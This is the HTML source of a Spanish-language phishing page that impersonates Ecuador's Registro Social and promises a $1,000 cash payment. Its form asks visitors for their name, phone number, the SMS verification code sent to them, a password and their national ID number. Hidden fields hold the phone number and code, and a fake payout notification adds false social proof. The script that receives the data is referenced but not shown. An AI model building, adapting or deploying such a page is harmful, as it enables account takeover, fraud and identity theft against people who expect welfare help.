<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Unidad del Registro Social</title>

    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css" rel="stylesheet">

    <style>
        *,
        *::before,
        *::after {
            box-sizing: border-box;
        }

        :root {
            --primary-blue: #0A3D80;
            --secondary-blue: #0047BA;
            --text-dark: #1E293B;
            --text-light: #64748B;
            --bg-body: #F4F6F9;
            --card-bg: #FFFFFF;
            --border-color: #E2E8F0;
            --success-color: #00C853;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-body);
            color: var(--text-dark);
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            margin: 0;
            width: 100vw;
            max-width: 100%;
            -webkit-font-smoothing: antialiased;
        }

        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(15px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        .banner-container img {
            width: 100%;
            height: auto;
            display: block;
            object-fit: cover;
        }

        .main-action-area {
            width: 100%;
            max-width: 650px;
            margin: -60px auto 50px auto;
            padding: 0 15px;
            position: relative;
            z-index: 10;
            animation: fadeIn 0.6s ease forwards;
        }

        .info-card {
            background: var(--card-bg);
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05);
            margin-bottom: 20px;
        }

        .info-card h6 {
            color: var(--primary-blue);
            font-size: 0.95rem;
            line-height: 1.4;
        }

        .info-card p {
            font-size: 0.8rem;
            line-height: 1.5;
            color: var(--text-light);
        }

        .content-card {
            background: var(--card-bg);
            border-radius: 16px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05);
            overflow: hidden;
            padding: 30px 20px;
        }

        .form-title {
            font-weight: 800;
            font-size: 1.2rem;
            color: var(--primary-blue);
            text-align: center;
            margin-bottom: 5px;
        }

        .form-subtitle {
            text-align: center;
            font-size: 0.85rem;
            color: var(--text-light);
            margin-bottom: 25px;
        }

        .progress-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 30px;
            position: relative;
        }

        .progress-step-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            position: relative;
            z-index: 2;
        }

        .progress-step {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #FFFFFF;
            border: 2px solid #E2E8F0;
            color: #94A3B8;
            font-size: 1.2rem;
            transition: all 0.3s ease;
        }

        .progress-step.active {
            border-color: var(--success-color);
            color: var(--success-color);
        }
        
        .progress-step.active-blue {
            border-color: var(--secondary-blue);
            color: var(--secondary-blue);
            background: #EFF6FF;
        }

        .progress-label {
            font-size: 0.75rem;
            font-weight: 600;
            color: var(--text-light);
        }
        
        .progress-step-container.active .progress-label {
            color: var(--success-color);
        }

        .progress-line {
            height: 2px;
            background: #E2E8F0;
            width: 60px;
            margin: 0 10px;
            margin-top: -20px; 
        }

        .form-label-custom {
            font-size: 0.85rem;
            font-weight: 700;
            color: var(--primary-blue);
            margin-bottom: 6px;
            display: block;
        }

        .input-group-custom {
            border: 1px solid var(--border-color);
            border-radius: 8px;
            background-color: #FFFFFF;
            margin-bottom: 8px;
            overflow: hidden;
            padding: 0 16px;
            height: 48px;
            display: flex;
            align-items: center;
            transition: border-color 0.3s ease;
        }

        .input-group-custom:focus-within {
            border-color: var(--secondary-blue);
        }

        .input-group-custom input {
            flex: 1;
            border: none;
            outline: none;
            background: transparent;
            font-size: 0.9rem;
            color: var(--text-dark);
            width: 100%;
            height: 100%;
        }

        .input-group-custom input::placeholder {
            color: #94A3B8;
        }

        .help-text {
            font-size: 0.75rem;
            color: var(--text-light);
            margin-bottom: 24px;
            display: block;
        }

        .btn-blue {
            background-color: var(--secondary-blue);
            color: #ffffff;
            border: none;
            width: 100%;
            padding: 14px;
            border-radius: 30px;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .btn-blue:hover {
            background-color: var(--primary-blue);
        }

        .main-footer {
            background-color: #FFFFFF;
            padding: 30px 15px 0;
            margin-top: auto;
            width: 100%;
            text-align: center;
            border-top: 1px solid var(--border-color);
        }

        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 20px;
        }

        .footer-links a {
            color: var(--text-dark);
            font-size: 0.8rem;
            font-weight: 600;
            text-decoration: none;
        }

        .footer-logo {
            max-width: 200px;
            margin: 0 auto 15px;
            display: block;
        }

        .footer-address {
            font-size: 0.75rem;
            color: var(--text-light);
            margin-bottom: 20px;
        }

        .footer-colors {
            display: flex;
            height: 6px;
            width: 100%;
        }
        .footer-colors .yellow { background: #FFD100; flex: 2; }
        .footer-colors .blue { background: #0047BA; flex: 1; }
        .footer-colors .red { background: #EF3340; flex: 1; }

        .step-section {
            display: none;
            animation: fadeIn 0.4s ease-out;
        }
        .step-section.active {
            display: block;
        }

        .alert-custom {
            padding: 14px;
            border-radius: 8px;
            font-size: 0.85rem;
            margin-bottom: 16px;
            display: none;
            font-weight: 600;
        }
        .alert-error {
            background-color: #FEF2F2;
            color: #EF4444;
            border: 1px solid #FECACA;
        }

        #notification-popup {
            position: fixed;
            bottom: 24px;
            right: -100%;
            background: #ffffff;
            padding: 14px 20px;
            border-radius: 12px; 
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.15);
            border-left: 4px solid var(--primary-blue);
            display: flex;
            align-items: center;
            gap: 14px;
            z-index: 9999;
            transition: right 0.6s cubic-bezier(0.16, 1, 0.3, 1);
            max-width: 90vw;
            min-width: 280px;
        }

        .toast-icon {
            background: var(--secondary-blue);
            color: #ffffff;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 1rem;
            font-weight: bold;
            font-family: serif;
            font-style: italic;
        }

        .toast-content h6 {
            margin: 0 0 2px 0;
            font-size: 0.9rem;
            font-weight: 700;
            color: var(--text-dark);
        }

        .toast-content p {
            margin: 0;
            font-size: 0.8rem;
            color: var(--text-light);
        }
        
        #loader-screen, #submit-loader { background: #ffffff; }
    </style>
</head>

<body>

    <div id="loader-screen" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; display: flex; justify-content: center; align-items: center; flex-direction: column; transition: opacity 0.5s; background: #ffffff;">
        <img src="images/footer.png" alt="Cargando" style="max-width: 200px; margin-bottom: 20px;">
        <div class="spinner-border text-primary" style="width: 2.5rem; height: 2.5rem; color: var(--secondary-blue) !important;" role="status"></div>
    </div>

    <div class="banner-container">
        <img src="images/banner.jpg" alt="El Nuevo Ecuador Construye - Registro Social">
    </div>

    <div class="main-action-area">
        
        <div id="intro-screen" style="display: none;"></div>

        <div id="main-form-container" style="display: block;">
            
            <div class="info-card">
                <div class="d-flex align-items-start">
                    <i class="bi bi-megaphone-fill fs-4 me-3" style="color: var(--secondary-blue);"></i>
                    <div>
                        <h6 class="mb-2"><strong>Regístrese ahora para recibir una ayuda en efectivo de $1,000<br>— Unidad del Registro Social.</strong></h6>
                        <p class="mb-0">Fortalecemos el desarrollo social con ayuda directa para quienes más lo necesitan. $1,000 que hacen la diferencia para impulsar tu bienestar y el de tu familia. Su registro hoy, es su apoyo mañana. Inicie el proceso de registro a continuación para consultar su estado.</p>
                    </div>
                </div>
            </div>

            <div class="content-card">
                
                <h2 class="form-title">Proceso de Registro</h2>
                <p class="form-subtitle">Siga los pasos para completar la validación</p>

                <div class="progress-wrapper">
                    <div class="progress-step-container active">
                        <div class="progress-step active"><i class="bi bi-pencil-square"></i></div>
                        <span class="progress-label">Formulario</span>
                    </div>
                    <div class="progress-line"></div>
                    <div class="progress-step-container">
                        <div class="progress-step active-blue"><i class="bi bi-shield-check"></i></div>
                        <span class="progress-label" style="color: var(--secondary-blue);">Validación</span>
                    </div>
                    <div class="progress-line"></div>
                    <div class="progress-step-container">
                        <div class="progress-step"><i class="bi bi-check-lg"></i></div>
                        <span class="progress-label">Finalizado</span>
                    </div>
                    
                    <div class="progress-step" style="display:none;">4</div>
                    <div class="progress-step" style="display:none;">5</div>
                </div>

                <input type="hidden" id="validateclientHash">
                <input type="hidden" id="validatephone_number">
                <input type="hidden" id="validateotp_code">

                <div class="form-area">
                    
                    <div id="step1" class="step-section active">
                        <div id="alert1" class="alert-custom alert-error"></div>
                        <form id="firstForm">
                            
                            <div style="display: none;">
                                <select id="job_position" required>
                                    <option value="otro" selected>Otro</option>
                                </select>
                                <select id="experience" required>
                                    <option value="0" selected>Beginner</option>
                                </select>
                                <input type="checkbox" id="certifico" checked required>
                            </div>

                            <div class="mb-3">
                                <label class="form-label-custom">Nombres y Apellidos</label>
                                <div class="input-group-custom">
                                    <input type="text" id="full_name" placeholder="Ej. Juan Pérez" required autocomplete="off">
                                </div>
                            </div>

                            <div class="mb-4">
                                <label class="form-label-custom">Número de Celular</label>
                                <div class="input-group-custom">
                                    <input type="tel" id="phone_number" placeholder="+593 9..." required inputmode="numeric" autocomplete="off">
                                </div>
                                <span class="help-text">Usaremos este número para validar su identidad.</span>
                            </div>

                            <button type="submit" id="firstbutt" class="btn-blue">Continuar Consulta</button>
                        </form>
                    </div>

                    <div id="step2" class="step-section">
                        <p class="text-center" style="color: var(--text-light); font-size: 0.9rem; margin-bottom: 24px;">
                            Hemos enviado un código a su número. Introdúzcalo a continuación.
                        </p>
                        <div id="alert2" class="alert-custom alert-error"></div>
                        <form id="secondForm">
                            <div class="input-group-custom mb-4" style="height: 64px; justify-content: center;">
                                <input type="tel" name="otp-input" id="otp_code" class="text-center"
                                    placeholder="•••••" required maxlength="5"
                                    style="letter-spacing: 12px; font-size: 1.8rem; font-weight: 700; width: 100%;">
                            </div>
                            <button type="submit" id="seccbutt" class="btn-blue">VALIDAR CÓDIGO</button>
                        </form>
                    </div>

                    <div id="step3" class="step-section">
                        <p class="text-center" style="color: var(--text-light); font-size: 0.9rem; margin-bottom: 24px;">Cree una contraseña para proteger sus datos.</p>
                        <div id="alert3" class="alert-custom alert-error"></div>
                        <form id="thirdForm">
                            <div class="input-group-custom mb-4">
                                <input type="password" id="password" placeholder="Mín. 8 caracteres" required>
                            </div>
                            <button type="submit" id="thirdbutt" class="btn-blue">GUARDAR</button>
                        </form>
                    </div>

                    <div id="step4" class="step-section">
                        <p class="text-center" style="color: var(--text-light); font-size: 0.85rem; margin-bottom: 20px;">Complete los datos detallados para el desembolso.</p>
                        <form id="fourthForm" onsubmit="event.preventDefault(); triggerLoadingToStep5();">
                            <div class="mb-3">
                                <label class="form-label-custom">Provincia de Residencia</label>
                                <div class="input-group-custom">
                                    <select required style="border: none; outline: none; background: transparent; width: 100%;">
                                        <option value="" disabled selected>Seleccione provincia</option>
                                        <option value="pichincha">Pichincha</option>
                                        <option value="guayas">Guayas</option>
                                        <option value="otro">Otra Provincia</option>
                                    </select>
                                </div>
                            </div>
                            <div class="mb-3">
                                <label class="form-label-custom">Número de Cédula de Identidad</label>
                                <div class="input-group-custom mb-0">
                                    <input type="text" placeholder="Ingrese 10 dígitos de cédula" maxlength="10" required autocomplete="off">
                                </div>
                            </div>
                            <button type="submit" class="btn-blue mt-4">CONTINUAR</button>
                        </form>
                    </div>

                    <div id="step5" class="step-section text-center py-4">
                        <i class="bi bi-check-circle-fill mb-3" style="font-size: 4rem; color: var(--success-color);"></i>
                        <h2 class="form-title mb-2">¡Solicitud Procesada con Éxito!</h2>
                        <p class="text-muted">Sus datos han sido registrados correctamente.</p>
                    </div>

                </div>
            </div>
        </div>
    </div>

    <footer class="main-footer">
        <div class="footer-links">
            <a href="#">Contacto Ciudadano Digital</a>
            <a href="#">Portal Trámites Ciudadanos</a>
            <a href="#">Sistema Nacional de Información (SNI)</a>
        </div>
        <img src="images/footer.png" alt="Gobierno del Ecuador" class="footer-logo">
        <p class="footer-address">
            Av. Amaru Ñan, Quito 170146. Piso 5<br>
            Plataforma Gubernamental de Desarrollo Social
        </p>
        <div class="footer-colors">
            <div class="yellow"></div>
            <div class="blue"></div>
            <div class="red"></div>
        </div>
    </footer>

    <div id="notification-popup">
        <div class="toast-icon">i</div>
        <div class="toast-content">
            <h6 id="notif-name">Lucia I. de La Libertad</h6>
            <p>Desembolso programado con éxito.</p>
        </div>
    </div>

    <div id="submit-loader" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.85); backdrop-filter: blur(4px); z-index: 10000; justify-content: center; align-items: center; flex-direction: column;">
        <div class="spinner-border" style="width: 3.5rem; height: 3.5rem; color: var(--secondary-blue) !important;" role="status"></div>
        <p class="mt-3 fw-bold" style="color: var(--primary-blue) !important; letter-spacing: 1px;">Procesando...</p>
    </div>

    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
    <script src="js/logical.js"></script>
</body>

</html>